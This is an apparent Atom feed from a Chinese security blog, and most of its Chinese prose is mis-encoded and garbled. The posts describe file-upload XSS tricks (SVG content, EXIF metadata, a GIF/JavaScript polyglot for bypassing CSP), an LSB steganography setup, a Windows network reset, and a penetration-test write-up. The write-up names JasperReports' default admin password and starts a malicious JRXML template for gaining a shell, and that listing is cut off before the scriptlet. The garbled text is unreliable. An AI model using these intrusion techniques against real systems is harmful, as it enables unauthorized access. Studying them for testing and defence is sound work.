        &lt;p&gt;â€‹    Powershell Empire æ˜¯æˆ‘ä»¬åœ¨æ¸—é€ç›®æ ‡ç”¨æˆ·æ—¶ä¸€ç›´éƒ½å¾ˆå–œæ¬¢çš„å·¥å…·ä¹‹ä¸€ï¼Œè™½ç„¶æˆ‘ä»¬é€šå¸¸éƒ½æ˜¯ç”¨Metaspolitå’ŒEmpireæ¥ä¸€èµ·å®Œæˆå·¥ä½œï¼Œä½¿æµè§ˆå™¨æ¼æ´å’Œç»éªŒç»“åˆåœ¨Empireä¸­ã€‚&lt;br&gt;åœ¨æœ€è¿‘çš„ä¸€æ¬¡æµ‹è¯•ä¸­æˆ‘ä»¬æ²¡æœ‰é€‰æ‹©å»ä½¿ç”¨MSFï¼Œç›¸åæˆ‘ä»¬å’Œä¸€ä¸ªæ–°çš„â€œç»
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSSå§¿åŠ¿â€”â€”æ–‡ä»¶ä¸Šä¼ XSS</title>
    <link href="http://zer0yu.github.io/2017/01/22/XSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS/"/>
    <id>http://zer0yu.github.io/2017/01/22/XSSå§¿åŠ¿â€”â€”æ–‡ä»¶ä¸Šä¼ XSS/</id>
    <published>2017-01-22T03:20:58.000Z</published>
    <updated>2017-01-22T03:21:29.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-ç®€å•ä»‹ç»"><a href="#0x01-ç®€å•ä»‹ç»" class="headerlink" title="0x01 ç®€å•ä»‹ç»"></a>0x01 ç®€å•ä»‹ç»</h1><hr><p>ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹æ˜¯æ‰§è¡ŒXSSåº”ç”¨ç¨‹åºçš„ç»ä½³æœºä¼šã€‚å¾ˆå¤šç½‘ç«™éƒ½æœ‰ç”¨æˆ·æƒé™ä¸Šä¼ ä¸ªäººèµ„æ–™å›¾ç‰‡çš„ä¸Šä¼ ç‚¹ï¼Œä½ æœ‰å¾ˆå¤šæœºä¼šæ‰¾åˆ°ç›¸å…³æ¼æ´ã€‚å¦‚æœç¢°å·§æ˜¯ä¸€ä¸ªself XSSï¼Œä½ å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ã€‚</p><h1 id="0x02-å®ä¾‹åˆ†æ"><a href="#0x02-å®ä¾‹åˆ†æ" class="headerlink" title="0x02 å®ä¾‹åˆ†æ"></a>0x02 å®ä¾‹åˆ†æ</h1><hr><p>é¦–å…ˆåŸºæœ¬ä¸Šæˆ‘ä»¬éƒ½å¯ä»¥æ‰¾åˆ°ç±»ä¼¼ä¸‹é¢çš„ä¸€ä¸ªæ”»å‡»å…¥å£ç‚¹ï¼Œæˆ‘è§‰å¾—è¿™ä¸ªå¹¶ä¸éš¾ã€‚</p><h3 id="å§¿åŠ¿ä¸€ï¼šæ–‡ä»¶åæ–¹å¼"><a href="#å§¿åŠ¿ä¸€ï¼šæ–‡ä»¶åæ–¹å¼" class="headerlink" title="å§¿åŠ¿ä¸€ï¼šæ–‡ä»¶åæ–¹å¼"></a>å§¿åŠ¿ä¸€ï¼šæ–‡ä»¶åæ–¹å¼</h3><p>æ–‡ä»¶åæœ¬èº«å¯èƒ½ä¼šåæ˜ åœ¨é¡µé¢æ‰€ä»¥ä¸€ä¸ªå¸¦æœ‰XSSå‘½åçš„æ–‡ä»¶ä¾¿å¯ä»¥èµ·åˆ°æ”»å‡»ä½œç”¨ã€‚</p><p><img src="http://static.wooyun.org/upload/image/201604/2016041510130259461.gif" alt="p1"></p><p>è™½ç„¶æˆ‘æ²¡æœ‰å‡†å¤‡é¶åœºï¼Œä½†æ˜¯ä½ å¯ä»¥é€‰æ‹©åœ¨<a href="http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value" target="_blank" rel="noopener">W3Schools</a>ç»ƒä¹ è¿™ç§XSS ã€‚</p><h3 id="å§¿åŠ¿äºŒï¼šMetadata"><a href="#å§¿åŠ¿äºŒï¼šMetadata" class="headerlink" title="å§¿åŠ¿äºŒï¼šMetadata"></a>å§¿åŠ¿äºŒï¼šMetadata</h3><p>ä½¿ç”¨<a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="noopener">exiftool</a>è¿™ä¸ªå·¥å…·å¯ä»¥é€šè¿‡æ”¹å˜EXIF  metadataè¿›è€Œä¸€å®šå‡ ç‡å¼•èµ·æŸå¤„åå°„ï¼š</p><p>ä¾‹å¦‚ï¼š</p><p><img src="http://static.wooyun.org//drops/20160414/2016041415305935841.jpg" alt="p2"></p><h3 id="å§¿åŠ¿ä¸‰ï¼šContent"><a href="#å§¿åŠ¿ä¸‰ï¼šContent" class="headerlink" title="å§¿åŠ¿ä¸‰ï¼šContent"></a>å§¿åŠ¿ä¸‰ï¼šContent</h3><p>å¦‚æœåº”ç”¨å…è®¸ä¸Šä¼ SVGæ ¼å¼çš„æ–‡ä»¶ï¼ˆå…¶å®å°±æ˜¯ä¸€ä¸ªå›¾åƒç±»å‹çš„ï¼‰ï¼Œé‚£ä¹ˆå¸¦æœ‰ä»¥ä¸‹contentçš„æ–‡ä»¶å¯ä»¥è¢«ç”¨æ¥è§¦å‘XSSï¼š</p><p>ä¸€ä¸ª PoCç”¨æ¥éªŒè¯ã€‚ä½ å¯ä»¥é€šè¿‡è®¿é—®brutelogic.com.br/poc.svgçœ‹åˆ°æ•ˆæœ</p><h3 id="å§¿åŠ¿å››ï¼šSource"><a href="#å§¿åŠ¿å››ï¼šSource" class="headerlink" title="å§¿åŠ¿å››ï¼šSource"></a>å§¿åŠ¿å››ï¼šSource</h3><p>å»ºç«‹ä¸€ä¸ªæºå¸¦æœ‰JavaScript payloadçš„GIFå›¾åƒç”¨ä½œä¸€ä¸ªè„šæœ¬çš„æºã€‚è¿™å¯¹ç»•è¿‡CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰ä¿æŠ¤â€œscript-src â€˜selfâ€™â€ï¼ˆå³ä¸å…è®¸ä½¿ç”¨ç¤ºä¾‹çš„è¿™ç§xssæ–¹å¼è¿›è¡Œæ”»å‡»<code>alert(1)</code>ï¼‰æ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œä½†å‰ææ˜¯æˆ‘ä»¬èƒ½å¤ŸæˆåŠŸåœ°åœ¨ç›¸åŒçš„åŸŸæ³¨å…¥ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p><p><img src="http://static.wooyun.org//drops/20160415/2016041501523324712.gif" alt="p3"></p><p>è¦åˆ›å»ºè¿™æ ·çš„å›¾åƒéœ€è¦è¿™ä¸ªä½œä¸ºcontent å’Œ nameï¼Œå¹¶ä½¿ç”¨.gifæ‰©å±•åï¼š</p><p>è¿™ä¸ªGIFçš„å›¾ç‰‡å¤´â€”â€”GIF89aï¼Œä½œä¸ºalert functionçš„å˜é‡åˆ†é…ç»™alert functionã€‚ä½†æ˜¯ä»–ä»¬ä¹‹é—´ï¼Œè¿˜æœ‰ä¸€ä¸ªè¢«æ ‡æ³¨çš„XSSå˜é‡ç”¨æ¥é˜²æ­¢å›¾ç‰‡è¢«æ¢å¤ä¸ºtext/HTML MIMEæ–‡ä»¶ç±»å‹ï¼Œå› æ­¤åªéœ€å‘é€ä¸€ä¸ªå¯¹è¿™ä¸ªæ–‡ä»¶çš„è¯·æ±‚payload å°±å¯ä»¥è¢«æ‰§è¡Œã€‚</p><p>æ­£å¦‚æˆ‘ä»¬ä¸‹é¢çœ‹åˆ°çš„ï¼Œæ–‡ä»¶ç±»unixå‘½ä»¤å’ŒPHPå‡½æ•°ä¸­çš„exif_imagetypeï¼ˆï¼‰å’Œgetimagesizeï¼ˆï¼‰ä¼šå°†å…¶è¯†åˆ«ä¸ºä¸€ä¸ªGIFæ–‡ä»¶ã€‚æ‰€ä»¥å¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åºä»…ä»…æ˜¯ä½¿ç”¨è¿™äº›æ–¹å¼éªŒè¯æ˜¯å¦æ˜¯ä¸€ä¸ªå›¾åƒï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°†å¯ä»¥ä¸Šä¼ æˆåŠŸï¼ˆä½†å¯èƒ½åœ¨ä¸Šä¼ åè¢«æ€æ‰ï¼‰ã€‚</p><p><img src="http://static.wooyun.org//drops/20160414/2016041415280360223pic42.png" alt="p4"></p><h1 id="0x03-æœ€å"><a href="#0x03-æœ€å" class="headerlink" title="0x03 æœ€å"></a>0x03 æœ€å</h1><hr><p>å¦‚æœä½ æƒ³çŸ¥é“æ›´å¤šçš„æœ‰å…¶æ ‡å¿—æ€§ASCIIå­—ç¬¦å¯ä»¥ç”¨äºä¸€ä¸ªjavascriptå˜é‡èµ‹å€¼çš„æ–‡ä»¶ç±»å‹ï¼Œçœ‹æˆ‘éšåçš„æ–‡ç« ã€‚</p><p>ä¹Ÿæœ‰å¾ˆå¤šæ¯”è¾ƒè¯¦ç»†çš„ä½¿ç”¨XSSå’Œå›¾åƒæ–‡ä»¶ç›¸ç»“åˆç»•è¿‡å›¾å½¢å¤„ç†å‡½æ•°åº“è¿‡æ»¤çš„ä¾‹å­ã€‚è¿™æ–¹é¢çš„ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ˜¯<a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="noopener">here</a></p><p>åŸæ–‡é“¾æ¥ï¼š<a href="http://brutelogic.com.br/blog/" target="_blank" rel="noopener">http://brutelogic.com.br/blog/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-ç®€å•ä»‹ç»&quot;&gt;&lt;a href=&quot;#0x01-ç®€å•ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;0x01 ç®€å•ä»‹ç»&quot;&gt;&lt;/a&gt;0x01 ç®€å•ä»‹ç»&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹æ˜¯æ‰§è¡ŒXSSåº”ç”¨ç¨‹åºçš„ç»ä½³æœºä¼šã€‚å¾ˆå¤šç½‘ç«™éƒ½æœ‰ç”¨æˆ·æƒé™ä¸Šä¼ ä¸ªäºº
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PNGæ–‡ä»¶ä¸­çš„LSBéšå†™</title>
    <link href="http://zer0yu.github.io/2017/01/22/PNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99/"/>
    <id>http://zer0yu.github.io/2017/01/22/PNGæ–‡ä»¶ä¸­çš„LSBéšå†™/</id>
    <published>2017-01-22T03:19:59.000Z</published>
    <updated>2017-01-22T03:20:44.000Z</updated>
    
    <content type="html"><![CDATA[<p>çœ‹åˆ°<a href="http://www.mottoin.com/88380.html" target="_blank" rel="noopener">Mott</a><a href="http://www.mottoin.com/88380.html" target="_blank" rel="noopener">oIn</a>çš„ä¸€ç¯‡æ–‡ç« æ—¶å…³äºLSBéšå†™çš„ï¼Œæ­£å¥½èµ¶ä¸Šä¸­ç§‹æ”’äº†ä¸€å †æœˆé¥¼æ²¡å¤„æ”¾ï¼Œå°±æƒ³ç”±æ­¤å‡ºä¸ªé¢˜é€é€æœˆé¥¼ã€‚</p><p>ç¯å¢ƒï¼š<strong>win10        python27</strong></p><p>lsbè„šæœ¬ä½¿ç”¨äº†<a href="https://github.com/cyberinc/cloacked-pixel" target="_blank" rel="noopener">https://github.com/cyberinc/cloacked-pixel</a></p><p>åœ¨ä½¿ç”¨ä¹‹å‰éœ€è¦å‡ ä¸ªpythonåŒ…ï¼Œä¸»è¦è¯´ä¸‹win10ä¸‹å¦‚ä½•å®‰è£…è¿™äº›åŒ…</p><p><strong>1.PIL</strong></p><p>è¿™ä¸ªåŒ…ä½ æŒ‰å»–é›ªå³°å®˜ç½‘ä¸Šçš„æ–¹æ³•å¯èƒ½å®‰è£…ä¸ä¸Šï¼Œæ‰€ä»¥æˆ‘ç»™å‡ºæˆ‘è‡ªå·±çš„è§£å†³åŠæ³•ï¼š</p><p>åˆ°<a href="https://pypi.python.org/pypi/Pillow/2.7.0æ‰¾åˆ°exeå®‰è£…åŒ…åŒå‡»" target="_blank" rel="noopener">https://pypi.python.org/pypi/Pillow/2.7.0æ‰¾åˆ°exeå®‰è£…åŒ…åŒå‡»</a></p><p>ä¸»è¦æ˜¯PILå®˜æ–¹ç¼–è¯‘åŒ…æœ‰bugï¼Œæ‰€ä»¥æœ€å¥½ä¸‹è½½ç¬¬ä¸‰æ–¹ç»„ç»‡ç¼–è¯‘åŒ…ï¼Œå¼ºçƒˆæ¨èpillowçš„ç¡®å¥½ç”¨</p><p><strong>2.matplotlib</strong></p><p>è¿™ä¸ªåŒ…çš„å®‰è£…ç›´æ¥å‚è€ƒå®˜æ–¹ç½‘ç«™çš„æ–¹æ³•ï¼Œæ³¨æ„ä¸€æ­¥ä¸€æ­¥æ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br><span class="line">python -m pip install --upgrade numpy</span><br><span class="line">python -m pip install --upgrade pytz</span><br><span class="line">python -m pip install --upgrade pyparsing</span><br><span class="line">python -m pip install --upgrade cycler</span><br><span class="line">python -m pip install --upgrade matplotlib</span><br></pre></td></tr></table></figure><p>è¿™å°±okäº†ï¼Œå¾ˆç®€å•ã€‚</p><p>æ¥ä¸‹æ¥æŒ‰ç…§MottoInè¿™ä¸ªç©å°±å¥½äº†ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;çœ‹åˆ°&lt;a href=&quot;http://www.mottoin.com/88380.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Mott&lt;/a&gt;&lt;a href=&quot;http://www.mottoin.com/88380.html&quot; target=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>win10åªæœ‰edgeå¯ä»¥æ‰“å¼€ç½‘é¡µ</title>
    <link href="http://zer0yu.github.io/2017/01/22/win10%E5%8F%AA%E6%9C%89edge%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5/"/>
    <id>http://zer0yu.github.io/2017/01/22/win10åªæœ‰edgeå¯ä»¥æ‰“å¼€ç½‘é¡µ/</id>
    <published>2017-01-22T03:19:37.000Z</published>
    <updated>2017-01-22T03:19:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>æŒ‰ä½win+x</p><p>ç„¶åé€‰æ‹©â€œå‘½ä»¤æç¤ºç¬¦ï¼ˆç®¡ç†å‘˜ï¼‰â€</p><p>è¾“å…¥ netsh winsock reset</p><p>é‡å¯å°±å¥½äº†ã€‚ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æŒ‰ä½win+x&lt;/p&gt;
&lt;p&gt;ç„¶åé€‰æ‹©â€œå‘½ä»¤æç¤ºç¬¦ï¼ˆç®¡ç†å‘˜ï¼‰â€&lt;/p&gt;
&lt;p&gt;è¾“å…¥ netsh winsock reset&lt;/p&gt;
&lt;p&gt;é‡å¯å°±å¥½äº†ã€‚ã€‚&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hacking JasperReports-éšè—shellçš„ç‰¹å¾</title>
    <link href="http://zer0yu.github.io/2017/01/22/Hacking-JasperReports-%E9%9A%90%E8%97%8Fshell%E7%9A%84%E7%89%B9%E5%BE%81/"/>
    <id>http://zer0yu.github.io/2017/01/22/Hacking-JasperReports-éšè—shellçš„ç‰¹å¾/</id>
    <published>2017-01-22T02:59:14.000Z</published>
    <updated>2017-01-22T03:04:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸ä¹…å‰ï¼Œæˆ‘çš„åŒäº‹è·Ÿæˆ‘åœ¨å¯¹ä¸€ä¸ªå®¢æˆ·ç«¯è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚æˆ‘ä»¬ç¡®å®å‘ç°çš„ä¸€ä»¶äº‹æ˜¯,ä»–ä»¬ç•™ä¸‹äº†å‡ ä¸ªè”ç½‘çš„JasperReportsæœåŠ¡å™¨ã€‚å¯»æ‰¾é»˜è®¤ç®¡ç†å¸æˆ·çš„ç”¨æˆ·åå¹¶æ²¡æœ‰èŠ±è´¹å¤ªå¤šçš„ç²¾åŠ›ã€‚<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/login.png?w=960" alt="login"></p><p>ä¹Ÿæ²¡æœ‰ç”¨å¤šä¹…æˆ‘ä»¬å°±çŒœè§£å‡ºå¯†ç æ˜¯â€œjasperadminâ€</p><p>æˆ‘ä»å‰å¬è¿‡JasperReportsä½†ä»æ¥æ²¡æœ‰ç¢°åˆ°è¿‡è¦å¯¹å®ƒè¿›è¡Œæ¸—é€æµ‹è¯•ã€‚ä¸€ä¸ªå¿«é€Ÿçš„googleæœç´¢ä¹Ÿæ²¡æœ‰å¯¹å‰æœŸå·¥ä½œäº§ç”Ÿå¤šå¤§çš„ä½œç”¨ã€‚å°½ç®¡è¿™ä¸ªç®¡ç†ç•Œé¢å¾ˆä¸å¸¸è§ä½†æ˜¯å®ƒä¹Ÿæ²¡æœ‰æ‘†è„±ä»¥æŸç§æ–¹å¼æ¥æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥é¡ºåˆ©æˆç« çš„æˆ‘ä»¬å¼€å§‹åœ¨æ¸—é€æ—…ç¨‹ä¸­æŠŠJasperReportsæ¸—é€æµ‹è¯•æ·»åŠ è¿›â€œå®¹æ˜“æˆåŠŸâ€çš„åˆ—è¡¨ã€‚</p><h4 id="ä»£ç å’Œå°è„šæœ¬"><a href="#ä»£ç å’Œå°è„šæœ¬" class="headerlink" title="ä»£ç å’Œå°è„šæœ¬"></a>ä»£ç å’Œå°è„šæœ¬</h4><p>JasperReportsçš„ç›®çš„æ˜¯æå–æ•°æ®ä»å„ç§å„æ ·çš„æ¥æºï¼Œä¾‹å¦‚ï¼šdatabases, xml, flat filesç­‰ç­‰ï¼Œå¹¶ä¸”åŸºäºç”¨æˆ·å®šä¹‰çš„æ¨¡æ¿ç”¨æŸç§æ–¹å¼ç”Ÿæˆä¸€ä»½æ¼‚äº®çš„æŠ¥å‘Šã€‚æ¨¡æ¿åœ¨JasperReportsè¢«å®šä¹‰ä¸ºâ€œJRXMLâ€æ–‡ä»¶ï¼Œä»»ä½•æ‹¥æœ‰åˆ›å»ºç¼–è¾‘æŠ¥å‘Šæƒé™çš„ç”¨æˆ·éƒ½å¯ä»¥ä¸Šä¼ å®ƒã€‚</p><p>JasperReportsçš„è®¾è®¡è€…å…è®¸æ•°æ®åœ¨è¢«åŒ…å«åœ¨æŠ¥å‘Šä¹‹å‰è‡ªå®šä¹‰æ“ä½œã€‚æ¥ä¸‹æ¥å°±æ˜¯åˆ©ç”¨ä¸€äº›å°æŠ€å·§ç”¨Javaæ¥ç¼–å†™ä¸€æ®µè„šæœ¬ï¼æˆ‘æƒ³ä¹Ÿè®¸ä½ ä¼šçœ‹åˆ°è¿™ä¸ªã€‚</p><p>æˆ‘ä»¬çš„ç›®æ ‡å‘¢ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªæŠ¥å‘Šæ¨¡æ¿ï¼ˆJRXML fileï¼‰å½“ç„¶æ˜¯ä¾æ—§å®šåˆ¶çš„æ¶æ„è„šæœ¬ï¼Œå½“å®ƒè¿è¡Œæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ”¶åˆ°ä¸€ä¸ªshellã€‚è¿™ç¯‡æ–‡ç« çš„å…¶ä½™éƒ¨åˆ†å°†ä¼šè¯¦ç»†æè¿°æˆ‘ä»¬æ˜¯å¦‚ä½•å°†è„šæœ¬å’ŒæŠ¥å‘Šæ¨¡æ¿è”ç³»åˆ°ä¸€èµ·çš„ã€‚</p><h4 id="ç¼–è¾‘æ¨¡æ¿"><a href="#ç¼–è¾‘æ¨¡æ¿" class="headerlink" title="ç¼–è¾‘æ¨¡æ¿"></a>ç¼–è¾‘æ¨¡æ¿</h4><p>æˆ‘ä»¬ä»…ä»…ç¼–è¾‘ä¸€ä¸ªå­˜åœ¨çš„æ¨¡æ¿è€Œä¸æ˜¯åˆ›å»ºä¸€ä¸ªã€‚ä»¥ä¸‹æ˜¯æˆ‘ä»¬å°†ä½¿ç”¨çš„æ¨¡æ¿ã€‚æ³¨æ„ä¸€ä¸‹ï¼Œè¿‡äºå¤æ‚ä»¥åŠå…¶ä¸­çš„90%æ˜¯å®Œå…¨ä¸å¿…è¦çš„ã€‚ä¸‹é¢è¿™ä¸ªåªæ˜¯ä¸€ä¸ªå¸¦æœ‰â€œJasperStudioâ€çš„ç®€å•æ ·æœ¬æŠ¥å‘Šã€‚35â€“42è¡Œæ˜¯æœ‰è¶£çš„ä¸€ä¸ªéƒ¨åˆ†ï¼Œæˆ‘åœ¨è¿™ä¸ªéƒ¨åˆ†æ’å…¥äº†â€œShellScriptletâ€ã€‚</p><p>shell.jrxml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 6.0.0 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 2016-10-04T14:01:12 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jasperReport</span> <span class="attr">xmlns</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://jasperreports.sourceforge.net/jasperreports http://jasperreports.sourceforge.net/xsd/jasperreport.xsd"</span> <span class="attr">name</span>=<span class="string">"AllAccounts"</span> <span class="attr">pageWidth</span>=<span class="string">"595"</span> <span class="attr">pageHeight</span>=<span class="string">"842"</span> <span class="attr">whenNoDataType</span>=<span class="string">"AllSectionsNoDetail"</span> <span class="attr">columnWidth</span>=<span class="string">"515"</span> <span class="attr">leftMargin</span>=<span class="string">"40"</span> <span class="attr">rightMargin</span>=<span class="string">"40"</span> <span class="attr">topMargin</span>=<span class="string">"50"</span> <span class="attr">bottomMargin</span>=<span class="string">"50"</span> <span class="attr">isSummaryWithPageHeaderAndFooter</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"17f4b3c5-e096-4a65-b030-ed3bb58ce311"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.language"</span> <span class="attr">value</span>=<span class="string">"EN-US"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Normal"</span> <span class="attr">isDefault</span>=<span class="string">"true"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>/&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Bold"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isBold</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"Sans_Italic"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span> <span class="attr">isItalic</span>=<span class="string">"true"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"PageHeader"</span> <span class="attr">style</span>=<span class="string">"Sans_Bold"</span> <span class="attr">forecolor</span>=<span class="string">"#FFFFFF"</span> <span class="attr">backcolor</span>=<span class="string">"#333333"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">name</span>=<span class="string">"detail"</span> <span class="attr">fontName</span>=<span class="string">"DejaVu Sans"</span> <span class="attr">fontSize</span>=<span class="string">"12"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">conditionalStyle</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">conditionExpression</span>&gt;</span>&lt;![CDATA[new Boolean($V&#123;CityGroup_COUNT&#125;.intValue() % 2 == 0)]]&gt;<span class="tag">&lt;/<span class="name">conditionExpression</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">style</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">backcolor</span>=<span class="string">"#E0E0E0"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">conditionalStyle</span>&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span 